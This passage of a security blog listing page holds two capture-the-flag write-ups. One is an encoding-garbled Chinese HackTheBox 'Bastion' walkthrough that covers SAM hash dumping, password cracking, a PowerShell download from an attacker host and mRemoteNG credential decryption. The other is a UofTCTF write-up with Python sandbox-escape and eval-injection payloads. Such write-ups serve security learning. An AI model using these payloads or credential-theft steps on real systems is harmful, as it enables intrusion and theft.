<p><img src="/images/placeholder.png" alt="åœ¨è¿™asdè¿°" data-src="/images/HTB-bastion/20200110013652862.png" class="lazyload"></p>
<p>7z æœ‰ä¸€ä¸ªåŠŸèƒ½æ˜¯å¯ä»¥è®©ä½ ç›´æ¥è¯»å– vhdæ–‡ä»¶çš„æ ¼å¼ã€‚æˆ‘ä»¬ç›´æ¥æ¥è¯»å–5gbçš„æ–‡ä»¶<br>(æ–‡ä»¶è¾ƒå¤§ å¤§æ¦‚2åˆ†é’Ÿå·¦å³ï¼Œ æ–‡ä»¶è¾ƒå¤šå°±åªå±•ç¤ºä¸€éƒ¨åˆ†ï¼‰</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">7z l 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="åœ¨fdsaf" data-src="/images/HTB-bastion/20200110014239133.png" class="lazyload"></p>
<p>å¯ä»¥çœ‹åˆ°è¿™æ˜¯å‡ ä¹æ•´ä¸ªwindowsçš„å¤‡ä»½ã€‚<br>æ—¢ç„¶æ˜¯windowså¤‡ä»½ æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ä»SAM Fileé‡Œé¢ç›´æ¥æå–ç”¨æˆ·çš„å¸å·å¯†ç å‘¢</p>
<h2 id="ä¸‰ï¼Œç”¨æˆ·å¸å·å¯†ç "><a href="#ä¸‰ï¼Œç”¨æˆ·å¸å·å¯†ç " class="headerlink" title="ä¸‰ï¼Œç”¨æˆ·å¸å·å¯†ç "></a>ä¸‰ï¼Œç”¨æˆ·å¸å·å¯†ç </h2><p>7z åªæ˜¯è®©æˆ‘ä»¬çœ‹åˆ°äº†æ–‡ä»¶ï¼Œè€Œä¸èƒ½çœ‹åˆ°å†…å®¹ã€‚<br>æˆ‘ç¨å¾®google äº†ä¸€ä¸‹ï¼Œå‘ç°ä¸€ä¸ªå…„å¼Ÿåœ¨mediumä¸Šé¢æœ‰ç¯‡æ–‡ç« åˆ©ç”¨ghost-mountæŒ‚è½½è™šæ‹Ÿç¡¬ç›˜ã€‚<br>linuxçš„ ghostmount èƒ½è®©æˆ‘ä»¬è¿›å…¥è™šæ‹Ÿç¡¬ç›˜çš„æ–‡ä»¶</p>
<p>é“¾æ¥: <a target="_blank" rel="noopener" href="https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25">æ–‡ç« åœ°å€</a></p>
<p>è·Ÿç€å¤§å“¥èµ°<br>é¦–å…ˆæˆ‘ä»¬éœ€è¦<strong>å®‰è£… libguestfs-tools</strong>è¿™ä¸ªåº“</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">apt-get install libguestfs-tools</span><br></pre></td></tr></tbody></table></figure>

<p>ç®€å•çš„å®‰è£…åï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶å¤¹ <strong>/mnt/vhd</strong></p>
<p>æŠŠvhdæŒ‚è½½åœ¨ è¿™ä¸ªæ–‡ä»¶å¤¹</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">guestmount --add /mnt/backup/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="åœ¨asdasd" data-src="/images/HTB-bastion/20200110015004404.png" class="lazyload"></p>
<p>å¯ä»¥çœ‹åˆ°å·²ç»å¯ä»¥è¿›å…¥åˆ° vhdæ–‡ä»¶é‡Œè¿›è¡Œæ“ä½œã€‚<br>æˆ‘é¦–å…ˆè¦åšçš„å°±æ˜¯èƒ½ä¸èƒ½ç›´æ¥åˆ°user desktopé‡Œæ‹¿åˆ° user.txt</p>
<p>samdump2å¯ä»¥å®Œæˆè¿™ä¸ªä»»åŠ¡</p>
<p><img src="/images/placeholder.png" alt="åœ¨è¿™asdasd" data-src="/images/HTB-bastion/20200110015521278.png" class="lazyload"></p>
<p>å…³äºå“ˆå¸Œå€¼çš„åˆ©ç”¨æ–¹æ³•å¾ˆå¤šï¼Œæ—¢ç„¶SMBæ˜¯å¼€ç€çš„ å®Œå…¨å¯ä»¥ç”¨å“ˆå¸Œå€¼ä¼ é€’æ”»å‡» ç™»å½•ç³»ç»Ÿã€‚<br>ä¸ªäººåŸå›  æˆ‘æ¯”è¾ƒå–œæ¬¢å°è¯•ç ´è§£å¯†ç </p>
<figure class="highlight llvm"><table><tbody><tr><td class="code"><pre><span class="line">*disabled* Administrator:<span class="number">500</span>:aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="number">31</span>d<span class="number">6</span>cfe<span class="number">0</span>d<span class="number">16</span>ae<span class="number">931</span>b<span class="number">73</span><span class="keyword">c</span><span class="number">59</span>d<span class="number">7e0</span><span class="keyword">c</span><span class="number">089</span><span class="keyword">c</span><span class="number">0</span>:::</span><br><span class="line">*disabled* Guest:<span class="number">501</span>:aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="number">31</span>d<span class="number">6</span>cfe<span class="number">0</span>d<span class="number">16</span>ae<span class="number">931</span>b<span class="number">73</span><span class="keyword">c</span><span class="number">59</span>d<span class="number">7e0</span><span class="keyword">c</span><span class="number">089</span><span class="keyword">c</span><span class="number">0</span>:::</span><br><span class="line">L<span class="number">4</span>mpje:<span class="number">1000</span>:aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="number">26112010952</span>d<span class="number">963</span><span class="keyword">c</span><span class="number">8</span>dc<span class="number">4217</span>daec<span class="number">986</span>d<span class="number">9</span>:::</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></tbody></table></figure>

<p>æ³¨æ„è¿™è¾¹ administratorå’Œ Guestæ˜¾å¾—çš„æ˜¯ <strong>disable</strong><br>æ­£å¸¸æ¥è¯´æ ¼å¼æ˜¯<br>&lt;ç”¨æˆ·å&gt;:&lt;ç”¨æˆ·ID&gt;:&lt; LM hash&gt;:&lt; NT hash&gt;:&lt;ç•™è¨€&gt;:&lt;ä¸»ç›®å½•&gt;<br>Administratorå’Œguestçš„ LM HASHå’ŒNT hashéƒ½æ˜¯ä¸€æ¨¡ä¸€æ ·ã€‚<br>è¿™è¾¹è¦æ³¨æ„ aad3 å’Œ 31d6 éƒ½æ˜¯ä»£è¡¨ä¸ºç©ºè¯´æ˜è¿™é‡Œæ²¡æœ‰æ•°å€¼<br>é¢˜å¤–è¯ã€‚</p>
<p>æˆ‘ä»¬æŠŠL4mpje çš„å“ˆå¸Œå€¼ä¸¢åˆ°crackstation.net è¿›è¡Œç ´è§£<br>å¾—åˆ°å¸å·å¯†ç <br>L4mpjeï¼šbureaulampje</p>
<p><img src="/images/placeholder.png" alt="åœ¨è¿™sadad" data-src="/images/HTB-bastion/20200110020035505.png" class="lazyload"></p>
<p>å¾ˆå¯æƒœ æˆ‘ä»¬æ²¡æœ‰ RDPï¼Œ ä½†æˆ‘ä»¬æœ‰SSHï¼ˆç‹—å¤´ï¼‰</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ssh L4mpje@10.10.10.134</span><br><span class="line">password: bureaulampje</span><br><span class="line">12</span><br></pre></td></tr></tbody></table></figure>

<p>æˆåŠŸæ‹¿åˆ° cmd shell<br><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/HTB-bastion/20200110020241609.png" class="lazyload"><br><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/HTB-bastion/20200110020309865.png" class="lazyload"><br>ç°åœ¨å¼€å§‹å‡†å¤‡ææƒã€‚<br>ç¢°åˆ°windows æˆ‘ä¸ªäººä¹ æƒ¯æ˜¯ä¸ŠJAWL çš„è„šæœ¬æ¥çœ‹ç³»ç»Ÿçš„ä¿¡æ¯æ¥å¸®åŠ©æˆ‘ææƒã€‚</p>
<p>é“¾æ¥: <a target="_blank" rel="noopener" href="https://github.com/411Hall/JAWS">Jawl githubåœ°å€</a></p>
<p>å› ä¸ºè¿™æ˜¯æˆ‘çš„ç¬¬ä¸€ä¸ªæ–‡ç«  æˆ‘å°±ç®€å•çš„è¯´ä¸‹ å¦‚ä½•åœ¨windowsé‡Œä¼ è¾“æ–‡ä»¶<br>å…¶å®æ–¹å¼æœ‰å¾ˆå¤šç§ï¼Œ<br>æœ‰çš„æƒ…å†µè¿™ä¸ªå¯ä»¥ æœ‰çš„æƒ…å†µé‚£ä¸ªå¯ä»¥<br>æˆ‘å°±ç®€å•è¯´ä¸€ä¸‹ æˆ‘ä¸ªäººå–œçˆ±çš„ä¸€ä¸ªæ–¹æ³•ã€‚<br><strong>powershell</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">powershell.exe -c <span class="string">"(new-object System.Net.WebClient).DownloadFile('http://10.10.14.12/jaw</span></span><br><span class="line"><span class="string">s-enum.ps1','C:\Users\L4mpje\Desktop\jaws-enum.ps1')</span></span><br><span class="line"><span class="string">12</span></span><br></pre></td></tr></tbody></table></figure>

<p>é¢˜å¤–è¯ç»“æŸ</p>
<p>æ‰§è¡Œjaws-enum.ps1</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>å¤§æ¦‚çš„çœ‹äº†ä¸‹ å¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰è¶£çš„ä¿¡æ¯ï¼Œä½†æœ‰ä¸€ä¸ªåœ°æ–¹å¼•èµ·äº†å…³æ³¨<br><strong>mRemoteNG</strong><br><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/HTB-bastion/20200110020826900.png" class="lazyload"></p>
<h2 id="å››ï¼Œææƒ"><a href="#å››ï¼Œææƒ" class="headerlink" title="å››ï¼Œææƒ"></a>å››ï¼Œææƒ</h2><p>ç¢°åˆ°é™Œç”Ÿçš„è½¯ä»¶å°±è¦ä¸ŠGoogleè¯¢é—®ï¼Œæœç„¶æˆ‘ä»¬å‘ç°äº†è¿™è½¯ä»¶å­˜åœ¨æ¯”è¾ƒå¼±çš„å¯†ç ä¿æŠ¤ç®¡ç†ã€‚<br><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’sad" data-src="/images/HTB-bastion/20200110021000221.png" class="lazyload"><br>åœ¨å¦å¤–ä¸€ç¯‡æ–‡ç« é‡Œ æˆ‘ä»¬å‘ç°äº†å‚¨å­˜å¯†ç çš„ç›®å½• æ˜¯ä½äºAppdataé‡Œã€‚</p>
<p>é“¾æ¥:<a target="_blank" rel="noopener" href="http://hackersvanguard.com/mremoteng-insecure-password-storage/">æ–‡ç« ä¼ é€é—¨</a></p>
<p><img src="/images/placeholder.png" alt="asdf" data-src="/images/HTB-bastion/20200110021043792.png" class="lazyload"><br>è¿™é‡Œå†è¯´ç‚¹é¢˜å¤–è¯ã€‚<br>Appdataå±äºéšè—çš„æ–‡ä»¶å¤¹ç±»å‹ æ­£å¸¸çš„dir æ˜¯æ— æ³•çœ‹è§æ–‡ä»¶å¤¹</p>
<p><img src="/images/placeholder.png" alt="sadfasdfaf" data-src="/images/HTB-bastion/20200110021237568.png" class="lazyload"></p>
<p>åˆ©ç”¨ <strong>dir/a</strong> æ¥æ˜¾ç¤ºå…¨éƒ¨çš„æ–‡ä»¶</p>
<p><img src="/images/placeholder.png" alt="asdf" data-src="/images/HTB-bastion/20200110021316395.png" class="lazyload"></p>
<p>æˆåŠŸæ‰¾åˆ°ç®¡ç†å‘˜çš„å¯†ç </p>
<p><img src="/images/placeholder.png" alt="a" data-src="/images/HTB-bastion/20200110021405254.png" class="lazyload"></p>
<p>åˆ©ç”¨githubä¸Šé¢çš„ä¸€ä¸ªpython è„šæœ¬ æ¥ç®—å‡ºå¯†ç </p>
<p>é“¾æ¥:githubä¼ é€é—¨</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 mremote_decrypt.py -s <span class="string">"aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="</span></span><br><span class="line"></span><br><span class="line">æˆåŠŸå–å¾—å¯†ç </span><br><span class="line">thXLHM96BeKL0ER2</span><br><span class="line">1234</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/HTB-bastion/20200110021514274.png" class="lazyload"></p>
<p>ç´§æ¥ç€ SSHç™»é™†ç®¡ç†å‘˜ å¹¶æ‹¿åˆ°root.txt</p>
<p><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/HTB-bastion/20200110021619237.png" class="lazyload"></p>
<br>
<br>
<br>

<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>

		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/01/10/HTB-bastion/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2007/12/31/CTF%20-%20uoftctf/">CTF - uoftctf</a>  
	       
		 

		<div class="meta">
			<time>Dec 31, 2007</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<h1 id="Jail-Babyâ€™s-First-PyJail"><a href="#Jail-Babyâ€™s-First-PyJail" class="headerlink" title="Jail - Babyâ€™s First PyJail"></a>Jail - Babyâ€™s First PyJail</h1><blockquote>
<p>@windex told me that jails should be sourceless. So no source for you.</p>
</blockquote>
<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115164611584.png" class="lazyload"></p>
<p>Certain words are filtered <code>'import', 'exec', 'eval', 'os', 'open', 'read', 'system', 'module', 'write', '.'</code></p>
<p>By printing the <code>__builtins__</code></p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="built_in">dir</span>(__builtins__))</span><br><span class="line">[<span class="string">'ArithmeticError'</span>, <span class="string">'AssertionError'</span>, <span class="string">'AttributeError'</span>, <span class="string">'BaseException'</span>, <span class="string">'BlockingIOError'</span>, <span class="string">'BrokenPipeError'</span>, <span class="string">'BufferError'</span>, <span class="string">'BytesWarning'</span>, <span class="string">'ChildProcessError'</span>, <span class="string">'ConnectionAbortedError'</span>, <span class="string">'ConnectionError'</span>, <span class="string">'ConnectionRefusedError'</span>, <span class="string">'ConnectionResetError'</span>, <span class="string">'DeprecationWarning'</span>, <span class="string">'EOFError'</span>, <span class="string">'Ellipsis'</span>, <span class="string">'EncodingWarning'</span>, <span class="string">'EnvironmentError'</span>, <span class="string">'Exception'</span>, <span class="string">'False'</span>, <span class="string">'FileExistsError'</span>, <span class="string">'FileNotFoundError'</span>, <span class="string">'FloatingPointError'</span>, <span class="string">'FutureWarning'</span>, <span class="string">'GeneratorExit'</span>, <span class="string">'IOError'</span>, <span class="string">'ImportError'</span>, <span class="string">'ImportWarning'</span>, <span class="string">'IndentationError'</span>, <span class="string">'IndexError'</span>, <span class="string">'InterruptedError'</span>, <span class="string">'IsADirectoryError'</span>, <span class="string">'KeyError'</span>, <span class="string">'KeyboardInterrupt'</span>, <span class="string">'LookupError'</span>, <span class="string">'MemoryError'</span>, <span class="string">'ModuleNotFoundError'</span>, <span class="string">'NameError'</span>, <span class="string">'None'</span>, <span class="string">'NotADirectoryError'</span>, <span class="string">'NotImplemented'</span>, <span class="string">'NotImplementedError'</span>, <span class="string">'OSError'</span>, <span class="string">'OverflowError'</span>, <span class="string">'PendingDeprecationWarning'</span>, <span class="string">'PermissionError'</span>, <span class="string">'ProcessLookupError'</span>, <span class="string">'RecursionError'</span>, <span class="string">'ReferenceError'</span>, <span class="string">'ResourceWarning'</span>, <span class="string">'RuntimeError'</span>, <span class="string">'RuntimeWarning'</span>, <span class="string">'StopAsyncIteration'</span>, <span class="string">'StopIteration'</span>, <span class="string">'SyntaxError'</span>, <span class="string">'SyntaxWarning'</span>, <span class="string">'SystemError'</span>, <span class="string">'SystemExit'</span>, <span class="string">'TabError'</span>, <span class="string">'TimeoutError'</span>, <span class="string">'True'</span>, <span class="string">'TypeError'</span>, <span class="string">'UnboundLocalError'</span>, <span class="string">'UnicodeDecodeError'</span>, <span class="string">'UnicodeEncodeError'</span>, <span class="string">'UnicodeError'</span>, <span class="string">'UnicodeTranslateError'</span>, <span class="string">'UnicodeWarning'</span>, <span class="string">'UserWarning'</span>, <span class="string">'ValueError'</span>, <span class="string">'Warning'</span>, <span class="string">'ZeroDivisionError'</span>, <span class="string">'__build_class__'</span>, <span class="string">'__debug__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__import__'</span>, <span class="string">'__loader__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'__spec__'</span>, <span class="string">'abs'</span>, <span class="string">'aiter'</span>, <span class="string">'all'</span>, <span class="string">'anext'</span>, <span class="string">'any'</span>, <span class="string">'ascii'</span>, <span class="string">'bin'</span>, <span class="string">'bool'</span>, <span class="string">'breakpoint'</span>, <span class="string">'bytearray'</span>, <span class="string">'bytes'</span>, <span class="string">'callable'</span>, <span class="string">'chr'</span>, <span class="string">'classmethod'</span>, <span class="string">'compile'</span>, <span class="string">'complex'</span>, <span class="string">'copyright'</span>, <span class="string">'credits'</span>, <span class="string">'delattr'</span>, <span class="string">'dict'</span>, <span class="string">'dir'</span>, <span class="string">'divmod'</span>, <span class="string">'enumerate'</span>, <span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'exit'</span>, <span class="string">'filter'</span>, <span class="string">'float'</span>, <span class="string">'format'</span>, <span class="string">'frozenset'</span>, <span class="string">'getattr'</span>, <span class="string">'globals'</span>, <span class="string">'hasattr'</span>, <span class="string">'hash'</span>, <span class="string">'help'</span>, <span class="string">'hex'</span>, <span class="string">'id'</span>, <span class="string">'input'</span>, <span class="string">'int'</span>, <span class="string">'isinstance'</span>, <span class="string">'issubclass'</span>, <span class="string">'iter'</span>, <span class="string">'len'</span>, <span class="string">'license'</span>, <span class="string">'list'</span>, <span class="string">'locals'</span>, <span class="string">'map'</span>, <span class="string">'max'</span>, <span class="string">'memoryview'</span>, <span class="string">'min'</span>, <span class="string">'next'</span>, <span class="string">'object'</span>, <span class="string">'oct'</span>, <span class="string">'open'</span>, <span class="string">'ord'</span>, <span class="string">'pow'</span>, <span class="string">'print'</span>, <span class="string">'property'</span>, <span class="string">'quit'</span>, <span class="string">'range'</span>, <span class="string">'repr'</span>, <span class="string">'reversed'</span>, <span class="string">'round'</span>, <span class="string">'set'</span>, <span class="string">'setattr'</span>, <span class="string">'slice'</span>, <span class="string">'sorted'</span>, <span class="string">'staticmethod'</span>, <span class="string">'str'</span>, <span class="string">'sum'</span>, <span class="string">'super'</span>, <span class="string">'tuple'</span>, <span class="string">'type'</span>, <span class="string">'vars'</span>, <span class="string">'zip'</span>]</span><br></pre></td></tr></tbody></table></figure>

<p>We are still able to use getattr to access the object even though the import is banned. And manipulate the string to avoid the blacklist detections.</p>
<p>The solution below avoids the black list character and dots.</p>
<figure class="highlight lisp"><table><tbody><tr><td class="code"><pre><span class="line">getattr(<span class="name">getattr</span>(<span class="name">globals</span>()['__builtins__'], '__im'+'port__')('o'+'s'), 'sys'+'tem')('cat flag.txt')</span><br><span class="line"></span><br><span class="line">Or</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getattr(<span class="name">getattr</span>(<span class="name">globals</span>()['__builtins__'], '__im'+'port__')('o'+'s'), 'sys'+'tem')('cat flag')</span><br></pre></td></tr></tbody></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.clementi.top/2023/07/13/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/index.html">https://www.clementi.top/2023/07/13/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/index.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/326406.html">https://www.freebuf.com/articles/web/326406.html</a>.</p>
<h1 id="Web-Voice-Changer"><a href="#Web-Voice-Changer" class="headerlink" title="Web - Voice Changer"></a>Web - Voice Changer</h1><blockquote>
<p>I made a cool app that changes your voice.</p>
</blockquote>
<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115165059839.png" class="lazyload"></p>
<p>Itâ€™s a web application to record voice and sent over to server side and will parse by ffmpeg.</p>
<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115165150001.png" class="lazyload"></p>
<p>During the analyse phase using burp, the pitch parameter found to be vulnerable to command injections and the result is return back in the output.</p>
<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115165259115.png" class="lazyload"></p>
<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115165323689.png" class="lazyload"></p>
<h1 id="Web-The-Varsity"><a href="#Web-The-Varsity" class="headerlink" title="Web - The Varsity"></a>Web - The Varsity</h1><blockquote>
<p>Come read our newspaper! Be sure to subscribe if you want access to the entire catalogue, including the latest issue.</p>
</blockquote>
<p>Source code is provided, basically after user register, it allows user to view articles.</p>
<p>According to the source code, the flag is stored at article 10</p>
<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115172824978.png" class="lazyload"></p>
<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115172922240.png" class="lazyload"></p>
<p>However viewing the article 10 requires subscription which the roles is embedded in JWT.</p>
<p>In this part of code, it provides the POST route for <code>/article</code>.</p>
<figure class="highlight js"><table><tbody><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">"/article"</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">  <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (token) {</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">      <span class="keyword">const</span> decoded = jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">JWT_SECRET</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> issue = req.<span class="property">body</span>.<span class="property">issue</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">issue</span> &lt; <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>({ <span class="attr">message</span>: <span class="string">"Invalid issue number"</span> });</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (decoded.<span class="property">subscription</span> !== <span class="string">"premium"</span> &amp;&amp; issue &gt;= <span class="number">9</span>) {</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">          .<span class="title function_">status</span>(<span class="number">403</span>)</span><br><span class="line">          .<span class="title function_">json</span>({ <span class="attr">message</span>: <span class="string">"Please subscribe to access this issue"</span> });</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      issue = <span class="built_in">parseInt</span>(issue);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="title class_">Number</span>.<span class="built_in">isNaN</span>(issue) || issue &gt; articles.<span class="property">length</span> - <span class="number">1</span>) {</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>({ <span class="attr">message</span>: <span class="string">"Invalid issue number"</span> });</span><br><span class="line">      }</span><br><span class="line">	  <span class="keyword">return</span> res.<span class="title function_">json</span>(articles[issue]);</span><br><span class="line">      ..................</span><br></pre></td></tr></tbody></table></figure>

<p>It seems that thereâ€™s some problem with the parseInt.</p>
<p>Before parseInt, issue have to be less than 9 and after the parseInt we need issue to be less than 10.</p>
<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115173721478.png" class="lazyload"></p>
<p>After some research we found that using the scientific notation able us to meet the condition.</p>
<p>when the value of issue is </p>
<p>we will craft the issue to be <code>"9.999e-1"</code> which will bypass the first check and after parseint the value of issues will be 9. </p>
<p>Since the value issue now is 9, it will also bypass the second check, and return <code>res.json(article[9])</code></p>
<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115183741018.png" class="lazyload"></p>
<h1 id="Web-No-Code"><a href="#Web-No-Code" class="headerlink" title="Web - No Code"></a>Web - No Code</h1><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/execute'</span>, methods=[<span class="string">'POST'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_code</span>():</span><br><span class="line">    code = request.form.get(<span class="string">'code'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">".*[\x20-\x7E]+.*"</span>, code):</span><br><span class="line">        <span class="keyword">return</span> jsonify({<span class="string">"output"</span>: <span class="string">"jk lmao no code"</span>}), <span class="number">403</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        result = <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify({<span class="string">"output"</span>: result}), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, port=<span class="number">1337</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>


<p><code>re.match(".*[\x20-\x7E]+.*", code)</code></p>
<p>This regex is using the <code>re.match()</code> function to check if the <code>code</code> string contains any printable ASCII characters. Letâ€™s break down the components:</p>
<ul>
<li><code>.*</code>: Matches any character (except for a newline) zero or more times.</li>
<li><code>[\x20-\x7E]+</code>: This is a character class that matches one or more characters within the hexadecimal range <code>\x20</code> (space) to <code>\x7E</code> (tilde). This range represents the printable ASCII characters, including letters, digits, punctuation, and some special characters.</li>
</ul>
<p>By enter a new line will bypass the check of regex</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"\n__builtins__.__import__('os').popen('cat flag.txt').read()"</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://uoftctf-no-code.chals.io/execute"</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url,data={<span class="string">"code"</span>:payload})</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></tbody></table></figure>

<p><code>{"output":"uoftctf{r3g3x_3p1c_f41L_XDDD}"}</code></p>

		  	  
	</div>



	<div class="article-categories">
	 
	</div>
	

	<div class="article-tags">
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2007/12/31/CTF%20-%20uoftctf/">Continue</a> 	
	</div>	
    
</article>

	
	

	
	
 
   <nav class="paginator">
    
        <a class="prev" href="/page/3/"> 
            <i class="iconfont icon-left"></i>
            Prev
        </a>
    

   <span class="page-number"> Page <strong>4</strong>, Posts <strong>33</strong>. </span>

    
        <a class="next" href="/page/5/"> 
            Next
            <i class="iconfont icon-right"></i>
        </a>
    
  </nav> 

	

    <script type="text/x-mathjax-config">
        var post = document.getElementsByClassName("post")[0];  
        MathJax.Hub.Config({
            showProcessingMessages: false,
            messageStyle: "none",    
            tex2jax: {
                inlineMath:  [ ["$", "$"] , ["\\(","\\)"]],
                displayMath: [ ["$$","$$"] , ["\\[","\\]"]],
                skipTags: ['script', 'noscript', 'style', 'textarea', 'pre','code','a'],
            },
            "HTML-CSS": {            
                showMathMenu: false
            }
        });
        MathJax.Hub.Queue(["Typeset",MathJax.Hub,post]);
    </script>
    <style>.MathJax{outline:0;}</style>

    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.2/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
 
</div>
          </div> 
      </div>            
    
        <i id="toTop" class="iconfont icon-backtotop"></i>

  
    <div class="none" id="search">
    <div class="header">
        <input type="text" placeholder="Typing Something here." id="search-input" class="input">
        
        <i id="search-cancel" class="iconfont icon-cancel"></i>
    </div>

    <div id="search-result" class="result"></div>
</div>
     <div class="mobile-menu">      

      
